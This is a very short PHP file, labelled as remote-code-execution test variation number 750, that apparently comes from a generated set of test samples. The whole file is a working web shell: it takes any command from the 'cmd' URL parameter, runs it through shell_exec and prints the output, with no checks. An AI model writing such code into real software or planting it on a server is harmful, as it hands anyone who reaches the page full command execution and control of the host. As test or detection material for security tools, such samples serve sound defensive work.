<?php
// RCE test variation #750
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>